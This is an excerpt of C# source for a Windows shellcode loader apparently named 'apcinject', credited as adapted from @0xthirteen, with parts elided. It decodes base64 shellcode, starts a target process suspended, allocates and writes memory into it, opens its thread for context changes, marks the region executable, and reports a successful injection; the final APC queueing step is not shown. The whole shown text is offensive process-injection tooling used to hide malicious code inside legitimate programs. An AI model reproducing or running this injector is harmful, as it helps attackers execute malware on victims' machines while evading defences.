...
namespace apcinject
{   //Slightly modified code from @0xthirteen 
    class Program
    {
        ...
        [Flags] public enum ThreadAccess : int { TERMINATE = (0x0001), SUSPEND_RESUME = (0x0002), GET_CONTEXT = (0x0008), SET_CONTEXT = (0x0010), SET_INFORMATION = (0x0020), QUERY_INFORMATION = (0x0040), SET_THREAD_TOKEN = (0x0080), IMPERSONATE = (0x0100), DIRECT_IMPERSONATION = (0x0200) }
        ...
        private static void Run(string path, string sc)
        {
            byte[] updcd = System.Convert.FromBase64String(sc);
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool success = CreateProcess(path, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, updcd.Length, 0x1000, 0x04);
            IntPtr bytesWritten = IntPtr.Zero;
            bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, updcd, updcd.Length, out bytesWritten);
            IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
            resultBool = VirtualProtectEx(pi.hProcess, resultPtr, updcd.Length, 0x40, out uint oldProtect);
        ...
        static void Main(string[] args)
        {
            ...
            {
                Run(args[0], args[1]);
                Console.WriteLine($"[+] Successfully injected into {args[0]}");
            }
            catch (Exception e)
            {
